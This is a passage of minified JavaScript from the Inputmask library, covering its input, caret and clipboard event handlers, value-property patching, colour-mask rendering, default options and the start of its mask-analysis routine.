                        return tt(o, !1, !1, u.toString().split("")), Y(o, I(), V($()), n, f !== I().join("")), n.preventDefault()
                    },
                    inputFallBackEvent: function(e) {
                        function n(t, e, n) {
                            return "." === e.charAt(n.begin - 1) && "" !== p.radixPoint && ((e = e.split(""))[n.begin - 1] = p.radixPoint.charAt(0), e = e.join("")), e
                        }

                        function i(t, e, n) {
                            if (a) {
                                var i = e.replace(I().join(""), "");
                                if (1 === i.length) {
                                    var o = e.split("");
                                    o.splice(n.begin, 0, i), e = o.join("")
                                }
                            }
                            return e
                        }
                        var o = this,
                            r = o.inputmask._valueGet();
                        if (I().join("") !== r) {
                            var s = nt(o);
                            if (r = n(o, r, s), r = i(o, r, s), I().join("") !== r) {
                                var l = I().join(""),
                                    u = !p.numericInput && r.length > l.length ? -1 : 0,
                                    h = r.substr(0, s.begin),
                                    d = r.substr(s.begin),
                                    f = l.substr(0, s.begin + u),
                                    m = l.substr(s.begin + u),
                                    g = s,
                                    v = "",
                                    y = !1;
                                if (h !== f) {
                                    var b, x = (y = h.length >= f.length) ? h.length : f.length;
                                    for (b = 0; h.charAt(b) === f.charAt(b) && b < x; b++);
                                    y && (g.begin = b - u, v += h.slice(b, g.end))
                                }
                                if (d !== m && (d.length > m.length ? v += d.slice(0, 1) : d.length < m.length && (g.end += m.length - d.length, y || "" === p.radixPoint || "" !== d || h.charAt(g.begin + u - 1) !== p.radixPoint || (g.begin--, v = p.radixPoint))), Y(o, I(), {
                                        begin: g.begin + u,
                                        end: g.end + u
                                    }), v.length > 0) t.each(v.split(""), (function(e, n) {
                                    var i = new t.Event("keypress");
                                    i.which = n.charCodeAt(0), _ = !1, J.keypressEvent.call(o, i)
                                }));
                                else {
                                    g.begin === g.end - 1 && (g.begin = U(g.begin + 1), g.begin === g.end - 1 ? nt(o, g.begin) : nt(o, g.begin, g.end));
                                    var w = new t.Event("keydown");
                                    w.keyCode = p.numericInput ? c.keyCode.BACKSPACE : c.keyCode.DELETE, J.keydownEvent.call(o, w)
                                }
                                e.preventDefault()
                            }
                        }
                    },
                    beforeInputEvent: function(e) {
                        if (e.cancelable) {
                            var n = this;
                            switch (e.inputType) {
                                case "insertText":
                                    return t.each(e.data.split(""), (function(e, i) {
                                        var o = new t.Event("keypress");
                                        o.which = i.charCodeAt(0), _ = !1, J.keypressEvent.call(n, o)
                                    })), e.preventDefault();
                                case "deleteContentBackward":
                                    return (i = new t.Event("keydown")).keyCode = c.keyCode.BACKSPACE, J.keydownEvent.call(n, i), e.preventDefault();
                                case "deleteContentForward":
                                    var i;
                                    return (i = new t.Event("keydown")).keyCode = c.keyCode.DELETE, J.keydownEvent.call(n, i), e.preventDefault()
                            }
                        }
                    },
                    setValueEvent: function(e) {
                        this.inputmask.refreshValue = !1;
                        var n = this,
                            i = (i = e && e.detail ? e.detail[0] : arguments[1]) || n.inputmask._valueGet(!0);
                        t.isFunction(p.onBeforeMask) && (i = p.onBeforeMask.call(b, i, p) || i), tt(n, !0, !1, i = i.split("")), f = I().join(""), (p.clearMaskOnLostFocus || p.clearIncomplete) && n.inputmask._valueGet() === N().join("") && n.inputmask._valueSet("")
                    },
                    focusEvent: function(t) {
                        var e = this,
                            n = e.inputmask._valueGet();
                        p.showMaskOnFocus && (!p.showMaskOnHover || p.showMaskOnHover && "" === n) && (e.inputmask._valueGet() !== I().join("") ? Y(e, I(), V($())) : !1 === S && nt(e, V($()))), !0 === p.positionCaretOnTab && !1 === S && J.clickEvent.apply(e, [t, !0]), f = I().join("")
                    },
                    mouseleaveEvent: function(t) {
                        var e = this;
                        S = !1, p.clearMaskOnLostFocus && n.activeElement !== e && (e.placeholder = y, "" === e.placeholder && e.removeAttribute("placeholder"))
                    },
                    clickEvent: function(e, o) {
                        function r(e) {
                            if ("" !== p.radixPoint) {
                                var n = E().validPositions;
                                if (n[e] === i || n[e].input === Q(e)) {
                                    if (e < V(-1)) return !0;
                                    var o = t.inArray(p.radixPoint, I());
                                    if (-1 !== o) {
                                        for (var r in n)
                                            if (o < r && n[r].input !== Q(r)) return !1;
                                        return !0
                                    }
                                }
                            }
                            return !1
                        }
                        var s = this;
                        setTimeout((function() {
                            if (n.activeElement === s) {
                                var t = nt(s);
                                if (o && (w ? t.end = t.begin : t.begin = t.end), t.begin === t.end) switch (p.positionCaretOnClick) {
                                    case "none":
                                        break;
                                    case "select":
                                        nt(s, 0, I().length);
                                        break;
                                    case "ignore":
                                        nt(s, V($()));
                                        break;
                                    case "radixFocus":
                                        if (r(t.begin)) {
                                            var e = I().join("").indexOf(p.radixPoint);
                                            nt(s, p.numericInput ? V(e) : e);
                                            break
                                        }
                                    default:
                                        var a = t.begin,
                                            l = $(a, !0),
                                            c = V(l);
                                        if (a < c) nt(s, X(a, !0) || X(a - 1, !0) ? a : V(a));
                                        else {
                                            var u = E().validPositions[l],
                                                h = O(c, u ? u.match.locator : i, u),
                                                d = Q(c, h.match);
                                            if ("" !== d && I()[c] !== d && !0 !== h.match.optionalQuantifier && !0 !== h.match.newBlockMarker || !X(c, p.keepStatic) && h.match.def === d) {
                                                var f = V(c);
                                                (a >= f || a === c) && (c = f)
                                            }
                                            nt(s, c)
                                        }
                                }
                            }
                        }), 0)
                    },
                    cutEvent: function(i) {
                        var o = this,
                            r = (t(o), nt(o)),
                            s = i.originalEvent || i,
                            a = e.clipboardData || s.clipboardData,
                            l = w ? I().slice(r.end, r.begin) : I().slice(r.begin, r.end);
                        a.setData("text", w ? l.reverse().join("") : l.join("")), n.execCommand && n.execCommand("copy"), st(o, c.keyCode.DELETE, r), Y(o, I(), E().p, i, f !== I().join(""))
                    },
                    blurEvent: function(e) {
                        var n = t(this),
                            o = this;
                        if (o.inputmask) {
                            o.placeholder = y, "" === o.placeholder && o.removeAttribute("placeholder");
                            var r = o.inputmask._valueGet(),
                                s = I().slice();
                            "" === r && v === i || (p.clearMaskOnLostFocus && (-1 === $() && r === N().join("") ? s = [] : ot(s)), !1 === rt(s) && (setTimeout((function() {
                                n.trigger("incomplete")
                            }), 0), p.clearIncomplete && (P(), s = p.clearMaskOnLostFocus ? [] : N().slice())), Y(o, s, i, e)), f !== I().join("") && (f = s.join(""), n.trigger("change"))
                        }
                    },
                    mouseenterEvent: function(t) {
                        var e = this;
                        S = !0, n.activeElement !== e && p.showMaskOnHover && (e.placeholder = (w ? I().slice().reverse() : I()).join(""))
                    },
                    submitEvent: function(t) {
                        f !== I().join("") && m.trigger("change"), p.clearMaskOnLostFocus && -1 === $() && x.inputmask._valueGet && x.inputmask._valueGet() === N().join("") && x.inputmask._valueSet(""), p.clearIncomplete && !1 === rt(I()) && x.inputmask._valueSet(""), p.removeMaskOnSubmit && (x.inputmask._valueSet(x.inputmask.unmaskedvalue(), !0), setTimeout((function() {
                            Y(x, I())
                        }), 0))
                    },
                    resetEvent: function(t) {
                        x.inputmask.refreshValue = !0, setTimeout((function() {
                            m.trigger("setvalue")
                        }), 0)
                    }
                };

            function tt(e, n, o, r, s) {
                var a = this || e.inputmask,
                    l = r.slice(),
                    u = "",
                    h = -1,
                    d = i;

                function f(t, e) {
                    return -1 !== T(!0, 0, !1).slice(t, V(t)).join("").replace(/'/g, "").indexOf(e) && !X(t) && (j(t).match.nativeDef === e.charAt(0) || null === j(t).match.fn && j(t).match.nativeDef === "'" + e.charAt(0) || " " === j(t).match.nativeDef && (j(t + 1).match.nativeDef === e.charAt(0) || null === j(t + 1).match.fn && j(t + 1).match.nativeDef === "'" + e.charAt(0)))
                }
                if (P(), o || !0 === p.autoUnmask) h = V(h);
                else {
                    var m = N().slice(0, V(-1)).join(""),
                        g = l.join("").match(new RegExp("^" + c.escapeRegex(m), "g"));
                    g && g.length > 0 && (l.splice(0, g.length * m.length), h = V(h))
                } - 1 === h ? (E().p = V(h), h = 0) : E().p = h, a.caretPos = {
                    begin: h
                }, t.each(l, (function(n, r) {
                    if (r !== i)
                        if (E().validPositions[n] === i && l[n] === Q(n) && X(n, !0) && !1 === z(n, l[n], !0, i, i, !0)) E().p++;
                        else {
                            var s = new t.Event("_checkval");
                            s.which = r.charCodeAt(0), u += r;
                            var c = $(i, !0);
                            f(h, u) ? d = J.keypressEvent.call(e, s, !0, !1, o, c + 1) : (d = J.keypressEvent.call(e, s, !0, !1, o, a.caretPos.begin)) && (h = a.caretPos.begin + 1, u = ""), d && (Y(i, I(), d.forwardPosition, s, !1), a.caretPos = {
                                begin: d.forwardPosition,
                                end: d.forwardPosition
                            })
                        }
                })), n && Y(e, I(), d ? d.forwardPosition : i, s || new t.Event("checkval"), s && "input" === s.type)
            }

            function et(e) {
                if (e) {
                    if (e.inputmask === i) return e.value;
                    e.inputmask && e.inputmask.refreshValue && J.setValueEvent.call(e)
                }
                var n = [],
                    o = E().validPositions;
                for (var r in o) o[r].match && null != o[r].match.fn && n.push(o[r].input);
                var s = 0 === n.length ? "" : (w ? n.reverse() : n).join("");
                if (t.isFunction(p.onUnMask)) {
                    var a = (w ? I().slice().reverse() : I()).join("");
                    s = p.onUnMask.call(b, a, s, p)
                }
                return s
            }

            function nt(o, r, s, a) {
                function l(t) {
                    return !w || "number" != typeof t || p.greedy && "" === p.placeholder || !x || (t = x.inputmask._valueGet().length - t), t
                }
                var c;
                if (r === i) return "selectionStart" in o ? (r = o.selectionStart, s = o.selectionEnd) : e.getSelection ? (c = e.getSelection().getRangeAt(0)).commonAncestorContainer.parentNode !== o && c.commonAncestorContainer !== o || (r = c.startOffset, s = c.endOffset) : n.selection && n.selection.createRange && (s = (r = 0 - (c = n.selection.createRange()).duplicate().moveStart("character", -o.inputmask._valueGet().length)) + c.text.length), {
                    begin: a ? r : l(r),
                    end: a ? s : l(s)
                };
                if (t.isArray(r) && (s = w ? r[0] : r[1], r = w ? r[1] : r[0]), r.begin !== i && (s = w ? r.begin : r.end, r = w ? r.end : r.begin), "number" == typeof r) {
                    r = a ? r : l(r), s = "number" == typeof(s = a ? s : l(s)) ? s : r;
                    var u = parseInt(((o.ownerDocument.defaultView || e).getComputedStyle ? (o.ownerDocument.defaultView || e).getComputedStyle(o, null) : o.currentStyle).fontSize) * s;
                    if (o.scrollLeft = u > o.scrollWidth ? u : 0, o.inputmask.caretPos = {
                            begin: r,
                            end: s
                        }, o === n.activeElement) {
                        if ("selectionStart" in o) o.selectionStart = r, o.selectionEnd = s;
                        else if (e.getSelection) {
                            if (c = n.createRange(), o.firstChild === i || null === o.firstChild) {
                                var h = n.createTextNode("");
                                o.appendChild(h)
                            }
                            c.setStart(o.firstChild, r < o.inputmask._valueGet().length ? r : o.inputmask._valueGet().length), c.setEnd(o.firstChild, s < o.inputmask._valueGet().length ? s : o.inputmask._valueGet().length), c.collapse(!0);
                            var d = e.getSelection();
                            d.removeAllRanges(), d.addRange(c)
                        } else o.createTextRange && ((c = o.createTextRange()).collapse(!0), c.moveEnd("character", s), c.moveStart("character", r), c.select());
                        lt(o, {
                            begin: r,
                            end: s
                        })
                    }
                }
            }

            function it(e) {
                var n, o, r = T(!0, $(), !0, !0),
                    s = r.length,
                    a = $(),
                    l = {},
                    c = E().validPositions[a],
                    u = c !== i ? c.locator.slice() : i;
                for (n = a + 1; n < r.length; n++) u = (o = O(n, u, n - 1)).locator.slice(), l[n] = t.extend(!0, {}, o);
                var p = c && c.alternation !== i ? c.locator[c.alternation] : i;
                for (n = s - 1; n > a && ((o = l[n]).match.optionality || o.match.optionalQuantifier && o.match.newBlockMarker || p && (p !== l[n].locator[c.alternation] && null != o.match.fn || null === o.match.fn && o.locator[c.alternation] && B(o.locator[c.alternation].toString().split(","), p.toString().split(",")) && "" !== F(n)[0].def)) && r[n] === Q(n, o.match); n--) s--;
                return e ? {
                    l: s,
                    def: l[s] ? l[s].match : i
                } : s
            }

            function ot(t) {
                t.length = 0;
                for (var e, n = T(!0, 0, !0, i, !0);
                    (e = n.shift()) !== i;) t.push(e);
                return t
            }

            function rt(e) {
                if (t.isFunction(p.isComplete)) return p.isComplete(e, p);
                if ("*" === p.repeat) return i;
                var n = !1,
                    o = it(!0),
                    r = U(o.l);
                if (o.def === i || o.def.newBlockMarker || o.def.optionality || o.def.optionalQuantifier) {
                    n = !0;
                    for (var s = 0; s <= r; s++) {
                        var a = O(s).match;
                        if (null !== a.fn && E().validPositions[s] === i && !0 !== a.optionality && !0 !== a.optionalQuantifier || null === a.fn && e[s] !== Q(s, a)) {
                            n = !1;
                            break
                        }
                    }
                }
                return n
            }

            function st(t, e, n, o, r) {
                if ((p.numericInput || w) && (e === c.keyCode.BACKSPACE ? e = c.keyCode.DELETE : e === c.keyCode.DELETE && (e = c.keyCode.BACKSPACE), w)) {
                    var s = n.end;
                    n.end = n.begin, n.begin = s
                }
                if (e === c.keyCode.BACKSPACE && n.end - n.begin < 1 ? (n.begin = U(n.begin), E().validPositions[n.begin] !== i && E().validPositions[n.begin].input === p.groupSeparator && n.begin--) : e === c.keyCode.DELETE && n.begin === n.end && (n.end = X(n.end, !0) && E().validPositions[n.end] && E().validPositions[n.end].input !== p.radixPoint ? n.end + 1 : V(n.end) + 1, E().validPositions[n.begin] !== i && E().validPositions[n.begin].input === p.groupSeparator && n.end++), G(n), !0 !== o && !1 !== p.keepStatic || null !== p.regex) {
                    var a = q(!0);
                    if (a) {
                        var l = a.caret !== i ? a.caret : a.pos ? V(a.pos.begin ? a.pos.begin : a.pos) : $(-1, !0);
                        (e !== c.keyCode.DELETE || n.begin > l) && n.begin
                    }
                }
                var u = $(n.begin, !0);
                if (u < n.begin || -1 === n.begin) E().p = V(u);
                else if (!0 !== o && (E().p = n.begin, !0 !== r))
                    for (; E().p < u && E().validPositions[E().p] === i;) E().p++
            }

            function at(i) {
                var o = (i.ownerDocument.defaultView || e).getComputedStyle(i, null);

                function r(t) {
                    var e, r = n.createElement("span");
                    for (var s in o) isNaN(s) && -1 !== s.indexOf("font") && (r.style[s] = o[s]);
                    r.style.textTransform = o.textTransform, r.style.letterSpacing = o.letterSpacing, r.style.position = "absolute", r.style.height = "auto", r.style.width = "auto", r.style.visibility = "hidden", r.style.whiteSpace = "nowrap", n.body.appendChild(r);
                    var a, l = i.inputmask._valueGet(),
                        c = 0;
                    for (e = 0, a = l.length; e <= a; e++) {
                        if (r.innerHTML += l.charAt(e) || "_", r.offsetWidth >= t) {
                            var u = t - c,
                                p = r.offsetWidth - t;
                            r.innerHTML = l.charAt(e), e = (u -= r.offsetWidth / 3) < p ? e - 1 : e;
                            break
                        }
                        c = r.offsetWidth
                    }
                    return n.body.removeChild(r), e
                }
                var s = n.createElement("div");
                s.style.width = o.width, s.style.textAlign = o.textAlign, v = n.createElement("div"), i.inputmask.colorMask = v, v.className = "im-colormask", i.parentNode.insertBefore(v, i), i.parentNode.removeChild(i), v.appendChild(i), v.appendChild(s), i.style.left = s.offsetLeft + "px", t(v).on("mouseleave", (function(t) {
                    return J.mouseleaveEvent.call(i, [t])
                })), t(v).on("mouseenter", (function(t) {
                    return J.mouseenterEvent.call(i, [t])
                })), t(v).on("click", (function(t) {
                    return nt(i, r(t.clientX)), J.clickEvent.call(i, [t])
                }))
            }

            function lt(t, e, o) {
                var r, s, a, l = [],
                    c = !1,
                    u = 0;

                function h(t) {
                    if (t === i && (t = ""), c || null !== r.fn && s.input !== i)
                        if (c && (null !== r.fn && s.input !== i || "" === r.def)) {
                            c = !1;
                            var e = l.length;
                            l[e - 1] = l[e - 1] + "</span>", l.push(t)
                        } else l.push(t);
                    else c = !0, l.push("<span class='im-static'>" + t)
                }

                function d() {
                    n.activeElement === t && (l.splice(e.begin, 0, e.begin === e.end || e.end > E().maskLength ? '<mark class="im-caret" style="border-right-width: 1px;border-right-style: solid;">' : '<mark class="im-caret-select">'), l.splice(e.end + 1, 0, "</mark>"))
                }
                if (v !== i) {
                    var f = I();
                    if (e === i ? e = nt(t) : e.begin === i && (e = {
                            begin: e,
                            end: e
                        }), !0 !== o) {
                        var m = $();
                        do {
                            E().validPositions[u] ? (s = E().validPositions[u], r = s.match, a = s.locator.slice(), h(f[u])) : (s = O(u, a, u - 1), r = s.match, a = s.locator.slice(), !1 === p.jitMasking || u < m || "number" == typeof p.jitMasking && isFinite(p.jitMasking) && p.jitMasking > u ? h(Q(u, r)) : c = !1), u++
                        } while ((g === i || u < g) && (null !== r.fn || "" !== r.def) || m > u || c);
                        c && h(), d()
                    }
                    var y = v.getElementsByTagName("div")[0];
                    y.innerHTML = l.join(""), t.inputmask.positionColorMask(t, y)
                }
            }

            function ct(e) {
                function o(e, o) {
                    function r(e) {
                        var r, a;

                        function l(e) {
                            if (t.valHooks && (t.valHooks[e] === i || !0 !== t.valHooks[e].inputmaskpatch)) {
                                var n = t.valHooks[e] && t.valHooks[e].get ? t.valHooks[e].get : function(t) {
                                        return t.value
                                    },
                                    r = t.valHooks[e] && t.valHooks[e].set ? t.valHooks[e].set : function(t, e) {
                                        return t.value = e, t
                                    };
                                t.valHooks[e] = {
                                    get: function(t) {
                                        if (t.inputmask) {
                                            if (t.inputmask.opts.autoUnmask) return t.inputmask.unmaskedvalue();
                                            var e = n(t);
                                            return -1 !== $(i, i, t.inputmask.maskset.validPositions) || !0 !== o.nullable ? e : ""
                                        }
                                        return n(t)
                                    },
                                    set: function(e, n) {
                                        var i, o = t(e);
                                        return i = r(e, n), e.inputmask && o.trigger("setvalue", [n]), i
                                    },
                                    inputmaskpatch: !0
                                }
                            }
                        }

                        function c() {
                            return this.inputmask ? this.inputmask.opts.autoUnmask ? this.inputmask.unmaskedvalue() : -1 !== $() || !0 !== o.nullable ? n.activeElement === this && o.clearMaskOnLostFocus ? (w ? ot(I().slice()).reverse() : ot(I().slice())).join("") : r.call(this) : "" : r.call(this)
                        }

                        function u(e) {
                            a.call(this, e), this.inputmask && t(this).trigger("setvalue", [e])
                        }

                        function p(e) {
                            K.on(e, "mouseenter", (function(e) {
                                var n = t(this);
                                this.inputmask._valueGet() !== I().join("") && n.trigger("setvalue")
                            }))
                        }
                        if (!e.inputmask.__valueGet) {
                            if (!0 !== o.noValuePatching) {
                                if (Object.getOwnPropertyDescriptor) {
                                    "function" != typeof Object.getPrototypeOf && (Object.getPrototypeOf = "object" === s("test".__proto__) ? function(t) {
                                        return t.__proto__
                                    } : function(t) {
                                        return t.constructor.prototype
                                    });
                                    var h = Object.getPrototypeOf ? Object.getOwnPropertyDescriptor(Object.getPrototypeOf(e), "value") : i;
                                    h && h.get && h.set ? (r = h.get, a = h.set, Object.defineProperty(e, "value", {
                                        get: c,
                                        set: u,
                                        configurable: !0
                                    })) : "INPUT" !== e.tagName && (r = function() {
                                        return this.textContent
                                    }, a = function(t) {
                                        this.textContent = t
                                    }, Object.defineProperty(e, "value", {
                                        get: c,
                                        set: u,
                                        configurable: !0
                                    }))
                                } else n.__lookupGetter__ && e.__lookupGetter__("value") && (r = e.__lookupGetter__("value"), a = e.__lookupSetter__("value"), e.__defineGetter__("value", c), e.__defineSetter__("value", u));
                                e.inputmask.__valueGet = r, e.inputmask.__valueSet = a
                            }
                            e.inputmask._valueGet = function(t) {
                                return w && !0 !== t ? r.call(this.el).split("").reverse().join("") : r.call(this.el)
                            }, e.inputmask._valueSet = function(t, e) {
                                a.call(this.el, null === t || t === i ? "" : !0 !== e && w ? t.split("").reverse().join("") : t)
                            }, r === i && (r = function() {
                                return this.value
                            }, a = function(t) {
                                this.value = t
                            }, l(e.type), p(e))
                        }
                    }
                    var a = e.getAttribute("type"),
                        l = "INPUT" === e.tagName && -1 !== t.inArray(a, o.supportsInputType) || e.isContentEditable || "TEXTAREA" === e.tagName;
                    if (!l)
                        if ("INPUT" === e.tagName) {
                            var c = n.createElement("input");
                            c.setAttribute("type", a), l = "text" === c.type, c = null
                        } else l = "partial";
                    return !1 !== l ? r(e) : e.inputmask = i, l
                }
                K.off(e);
                var a = o(e, p);
                if (!1 !== a && (m = t(x = e), y = x.placeholder, -1 === (g = x !== i ? x.maxLength : i) && (g = i), !0 === p.colorMask && at(x), r && ("inputmode" in x && (x.inputmode = p.inputmode, x.setAttribute("inputmode", p.inputmode)), !0 === p.disablePredictiveText && ("autocorrect" in x ? x.autocorrect = !1 : (!0 !== p.colorMask && at(x), x.type = "password"))), !0 === a && (x.setAttribute("im-insert", p.insertMode), K.on(x, "submit", J.submitEvent), K.on(x, "reset", J.resetEvent), K.on(x, "blur", J.blurEvent), K.on(x, "focus", J.focusEvent), !0 !== p.colorMask && (K.on(x, "click", J.clickEvent), K.on(x, "mouseleave", J.mouseleaveEvent), K.on(x, "mouseenter", J.mouseenterEvent)), K.on(x, "paste", J.pasteEvent), K.on(x, "cut", J.cutEvent), K.on(x, "complete", p.oncomplete), K.on(x, "incomplete", p.onincomplete), K.on(x, "cleared", p.oncleared), r || !0 === p.inputEventOnly ? x.removeAttribute("maxLength") : (K.on(x, "keydown", J.keydownEvent), K.on(x, "keypress", J.keypressEvent)), K.on(x, "input", J.inputFallBackEvent), K.on(x, "beforeinput", J.beforeInputEvent)), K.on(x, "setvalue", J.setValueEvent), f = N().join(""), "" !== x.inputmask._valueGet(!0) || !1 === p.clearMaskOnLostFocus || n.activeElement === x)) {
                    var l = t.isFunction(p.onBeforeMask) && p.onBeforeMask.call(b, x.inputmask._valueGet(!0), p) || x.inputmask._valueGet(!0);
                    "" !== l && tt(x, !0, !1, l.split(""));
                    var c = I().slice();
                    f = c.join(""), !1 === rt(c) && p.clearIncomplete && P(), p.clearMaskOnLostFocus && n.activeElement !== x && (-1 === $() ? c = [] : ot(c)), (!1 === p.clearMaskOnLostFocus || p.showMaskOnFocus && n.activeElement === x || "" !== x.inputmask._valueGet(!0)) && Y(x, c), n.activeElement === x && nt(x, V($()))
                }
            }
            if (c.prototype.positionColorMask = function(t, e) {
                    t.style.left = e.offsetLeft + "px"
                }, o !== i) switch (o.action) {
                case "isComplete":
                    return x = o.el, rt(I());
                case "unmaskedvalue":
                    return x !== i && o.value === i || (Z = o.value, Z = (t.isFunction(p.onBeforeMask) && p.onBeforeMask.call(b, Z, p) || Z).split(""), tt.call(this, i, !1, !1, Z), t.isFunction(p.onBeforeWrite) && p.onBeforeWrite.call(b, i, I(), 0, p)), et(x);
                case "mask":
                    ct(x);
                    break;
                case "format":
                    return Z = (t.isFunction(p.onBeforeMask) && p.onBeforeMask.call(b, o.value, p) || o.value).split(""), tt.call(this, i, !0, !1, Z), o.metadata ? {
                        value: w ? I().slice().reverse().join("") : I().join(""),
                        metadata: d.call(this, {
                            action: "getmetadata"
                        }, u, p)
                    } : w ? I().slice().reverse().join("") : I().join("");
                case "isValid":
                    o.value ? (Z = o.value.split(""), tt.call(this, i, !0, !0, Z)) : o.value = I().join("");
                    for (var ut = I(), pt = it(), ht = ut.length - 1; ht > pt && !X(ht); ht--);
                    return ut.splice(pt, ht + 1 - pt), rt(ut) && o.value === I().join("");
                case "getemptymask":
                    return N().join("");
                case "remove":
                    return x && x.inputmask && (t.data(x, "_inputmask_opts", null), m = t(x), x.inputmask._valueSet(p.autoUnmask ? et(x) : x.inputmask._valueGet(!0)), K.off(x), x.inputmask.colorMask && ((v = x.inputmask.colorMask).removeChild(x), v.parentNode.insertBefore(x, v), v.parentNode.removeChild(v)), Object.getOwnPropertyDescriptor && Object.getPrototypeOf ? Object.getOwnPropertyDescriptor(Object.getPrototypeOf(x), "value") && x.inputmask.__valueGet && Object.defineProperty(x, "value", {
                        get: x.inputmask.__valueGet,
                        set: x.inputmask.__valueSet,
                        configurable: !0
                    }) : n.__lookupGetter__ && x.__lookupGetter__("value") && x.inputmask.__valueGet && (x.__defineGetter__("value", x.inputmask.__valueGet), x.__defineSetter__("value", x.inputmask.__valueSet)), x.inputmask = i), x;
                case "getmetadata":
                    if (t.isArray(u.metadata)) {
                        var dt = T(!0, 0, !1).join("");
                        return t.each(u.metadata, (function(t, e) {
                            if (e.mask === dt) return dt = e, !1
                        })), dt
                    }
                    return u.metadata
            }
        }
        return c.prototype = {
            dataAttribute: "data-inputmask",
            defaults: {
                placeholder: "_",
                optionalmarker: ["[", "]"],
                quantifiermarker: ["{", "}"],
                groupmarker: ["(", ")"],
                alternatormarker: "|",
                escapeChar: "\\",
                mask: null,
                regex: null,
                oncomplete: t.noop,
                onincomplete: t.noop,
                oncleared: t.noop,
                repeat: 0,
                greedy: !1,
                autoUnmask: !1,
                removeMaskOnSubmit: !1,
                clearMaskOnLostFocus: !0,
                insertMode: !0,
                clearIncomplete: !1,
                alias: null,
                onKeyDown: t.noop,
                onBeforeMask: null,
                onBeforePaste: function(e, n) {
                    return t.isFunction(n.onBeforeMask) ? n.onBeforeMask.call(this, e, n) : e
                },
                onBeforeWrite: null,
                onUnMask: null,
                showMaskOnFocus: !0,
                showMaskOnHover: !0,
                onKeyValidation: t.noop,
                skipOptionalPartCharacter: " ",
                numericInput: !1,
                rightAlign: !1,
                undoOnEscape: !0,
                radixPoint: "",
                _radixDance: !1,
                groupSeparator: "",
                keepStatic: null,
                positionCaretOnTab: !0,
                tabThrough: !1,
                supportsInputType: ["text", "tel", "password", "search"],
                ignorables: [8, 9, 13, 19, 27, 33, 34, 35, 36, 37, 38, 39, 40, 45, 46, 93, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 0, 229],
                isComplete: null,
                preValidation: null,
                postValidation: null,
                staticDefinitionSymbol: i,
                jitMasking: !1,
                nullable: !0,
                inputEventOnly: !1,
                noValuePatching: !1,
                positionCaretOnClick: "lvp",
                casing: null,
                inputmode: "verbatim",
                colorMask: !1,
                disablePredictiveText: !1,
                importDataAttributes: !0
            },
            definitions: {
                9: {
                    validator: "[0-9１-９]",
                    definitionSymbol: "*"
                },
                a: {
                    validator: "[A-Za-zА-яЁёÀ-ÿµ]",
                    definitionSymbol: "*"
                },
                "*": {
                    validator: "[0-9１-９A-Za-zА-яЁёÀ-ÿµ]"
                }
            },
            aliases: {},
            masksCache: {},
            mask: function(o) {
                var r = this;

                function s(n, o, r, s) {
                    if (!0 === o.importDataAttributes) {
                        var a, l, c, p, h = function(t, o) {
                                null !== (o = o !== i ? o : n.getAttribute(s + "-" + t)) && ("string" == typeof o && (0 === t.indexOf("on") ? o = e[o] : "false" === o ? o = !1 : "true" === o && (o = !0)), r[t] = o)
                            },
                            d = n.getAttribute(s);
                        if (d && "" !== d && (d = d.replace(/'/g, '"'), l = JSON.parse("{" + d + "}")), l)
                            for (p in c = i, l)
                                if ("alias" === p.toLowerCase()) {
                                    c = l[p];
                                    break
                                }
                        for (a in h("alias", c), r.alias && u(r.alias, r, o), o) {
                            if (l)
                                for (p in c = i, l)
                                    if (p.toLowerCase() === a.toLowerCase()) {
                                        c = l[p];
                                        break
                                    }
                            h(a, c)
                        }
                    }
                    return t.extend(!0, o, r), ("rtl" === n.dir || o.rightAlign) && (n.style.textAlign = "right"), ("rtl" === n.dir || o.numericInput) && (n.dir = "ltr", n.removeAttribute("dir"), o.isRTL = !0), Object.keys(r).length
                }
                return "string" == typeof o && (o = n.getElementById(o) || n.querySelectorAll(o)), o = o.nodeName ? [o] : o, t.each(o, (function(e, n) {
                    var o = t.extend(!0, {}, r.opts);
                    if (s(n, o, t.extend(!0, {}, r.userOptions), r.dataAttribute)) {
                        var a = p(o, r.noMasksCache);
                        a !== i && (n.inputmask !== i && (n.inputmask.opts.autoUnmask = !0, n.inputmask.remove()), n.inputmask = new c(i, i, !0), n.inputmask.opts = o, n.inputmask.noMasksCache = r.noMasksCache, n.inputmask.userOptions = t.extend(!0, {}, r.userOptions), n.inputmask.isRTL = o.isRTL || o.numericInput, n.inputmask.el = n, n.inputmask.maskset = a, t.data(n, "_inputmask_opts", o), d.call(n.inputmask, {
                            action: "mask"
                        }))
                    }
                })), o && o[0] && o[0].inputmask || this
            },
            option: function(e, n) {
                return "string" == typeof e ? this.opts[e] : "object" === (void 0 === e ? "undefined" : s(e)) ? (t.extend(this.userOptions, e), this.el && !0 !== n && this.mask(this.el), this) : void 0
            },
            unmaskedvalue: function(t) {
                return this.maskset = this.maskset || p(this.opts, this.noMasksCache), d.call(this, {
                    action: "unmaskedvalue",
                    value: t
                })
            },
            remove: function() {
                return d.call(this, {
                    action: "remove"
                })
            },
            getemptymask: function() {
                return this.maskset = this.maskset || p(this.opts, this.noMasksCache), d.call(this, {
                    action: "getemptymask"
                })
            },
            hasMaskedValue: function() {
                return !this.opts.autoUnmask
            },
            isComplete: function() {
                return this.maskset = this.maskset || p(this.opts, this.noMasksCache), d.call(this, {
                    action: "isComplete"
                })
            },
            getmetadata: function() {
                return this.maskset = this.maskset || p(this.opts, this.noMasksCache), d.call(this, {
                    action: "getmetadata"
                })
            },
            isValid: function(t) {
                return this.maskset = this.maskset || p(this.opts, this.noMasksCache), d.call(this, {
                    action: "isValid",
                    value: t
                })
            },
            format: function(t, e) {
                return this.maskset = this.maskset || p(this.opts, this.noMasksCache), d.call(this, {
                    action: "format",
                    value: t,
                    metadata: e
                })
            },
            setValue: function(e) {
                this.el && t(this.el).trigger("setvalue", [e])
            },
            analyseMask: function(e, n, o) {
                var r, s, a, l, u, p, h = /(?:[?*+]|\{[0-9\+\*]+(?:,[0-9\+\*]*)?(?:\|[0-9\+\*]*)?\})|[^.?*+^${[]()|\\]+|./g,
                    d = /\[\^?]?(?:[^\\\]]+|\\[\S\s]?)*]?|\\(?:0(?:[0-3][0-7]{0,2}|[4-7][0-7]?)?|[1-9][0-9]*|x[0-9A-Fa-f]{2}|u[0-9A-Fa-f]{4}|c[A-Za-z]|[\S\s]?)|\((?:\?[:=!]?)?|(?:[?*+]|\{[0-9]+(?:,[0-9]*)?\})\??|[^.?*+^${[()|\\]+|./g,
                    f = !1,
                    m = new y,
                    g = [],
                    v = [];

                function y(t, e, n, i) {
